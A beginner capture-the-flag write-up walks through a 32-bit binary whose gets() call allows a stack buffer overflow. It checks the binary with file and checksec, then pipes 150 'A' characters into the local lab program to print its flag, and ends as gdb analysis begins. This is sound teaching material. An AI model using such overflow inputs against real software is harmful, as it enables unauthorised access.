# Challenge 1
## Description
Let's start off simple, can you overflow the correct buffer?

### Two files were comrades in the challenge. (vuln.c , vuln)
#### vlun.c
<img src="https://github.com/q5fj/Pwn/assets/88992167/76c5aa29-ee1d-4098-bd72-92e7207f575c">

We note that in the code the binary file will not work unless the binary file path contains a file named flag.txt
<img src="https://github.com/q5fj/Pwn/assets/88992167/0a7f786c-8fbc-4524-832f-c38b7a61fcf3">

Also notice we have "gets" in the user input 

##### gets - get a string from standard input (DEPRECATED)
<img src="https://github.com/q5fj/Pwn/assets/88992167/0ae608e9-5726-4212-8449-47e2ea331cb7">

Now that have analyzed the source, let us move to the binary file:
#### vuln
#### Command :-
```
file vuln 
```
<img src="https://github.com/q5fj/Pwn/assets/88992167/0b59e5e3-38cb-4508-926f-0961f43efe8e">

The file is 32 bit, let's check the security features : 
#### Command :-
```
checksec vuln 
```
<img src="https://github.com/q5fj/Pwn/assets/88992167/598555c8-43eb-48d6-a71e-04da7dcd334e">

No stack canary, assume BOF.

Let's run the file and see what happens.
#### Don't forget to create a flag.txt file for the file to work :-
```
echo "Flag{1234567890}" > flag.txt
```
and run the file:-
```
./vuln
```
<img src="https://github.com/q5fj/Pwn/assets/88992167/1c98a2ec-7e8c-41d5-ab81-c8d787f95f6b">

We also see the user input and the program exits :)

If we remember that it uses the `gets` function, which is a dangerous function that leads to a buffer overflow because it does not read user input.

Let's try to enter a byte higher than 100
```
python -c 'print("A" * 150)' | ./vuln
```
We notice that the program printed the contents of the flag.txt file.

<img src="https://github.com/q5fj/Pwn/assets/88992167/b67559bb-9639-4f40-998d-bc256754b291">


Now let's start examining the file closely :)

I will use gdb tool
```
gdb ./vuln -q
```
I will display the functions inside the file 
#### Command :-
```
info functions
```
<img src="https://github.com/q5fj/Pwn/assets/88992167/dc92ea00-d1dd-462f-9b60-d86e3432bb0e">


